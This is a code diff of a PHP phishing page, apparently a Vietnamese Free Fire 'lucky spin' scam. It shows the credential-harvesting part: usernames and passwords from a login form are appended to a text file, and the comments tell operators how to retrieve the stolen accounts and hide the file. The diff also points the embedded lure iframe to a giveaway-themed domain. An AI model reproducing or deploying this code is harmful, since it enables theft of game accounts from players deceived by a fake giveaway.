@@ -6,7 +6,7 @@
       $password = $_POST["matkhau"];
       $_SESSION["username"] = $username;
        $body = "\nTài Khoản :$username\nMật Khẩu :$password\n"; //tùy host có thể lỗi font chữ email thì ae vô thẳng file txt trong file manager của host
-      $test = fopen("hu.txt","a");//đổi tên file hu.txt này để tránh trường hợp người khác vào lấy acc
+      $test = fopen("acc.txt","a");//đổi tên file hu.txt này để tránh trường hợp người khác vào lấy acc
       fwrite($test,$body);
       fclose($test); 
     }
@@ -76,7 +76,7 @@
               <body  >
            
               <div class="container" >
-                  <iframe class="responsive-iframe" id="iframe" sandbox src="https://trianff.com/vongquay.html"></iframe>
+                  <iframe class="responsive-iframe" id="iframe" sandbox src="https://vongquay-freefire.com/vongquay.html"></iframe>
                 </div>
 
                 <div class="modal fade" id="myModal" role="dialog">
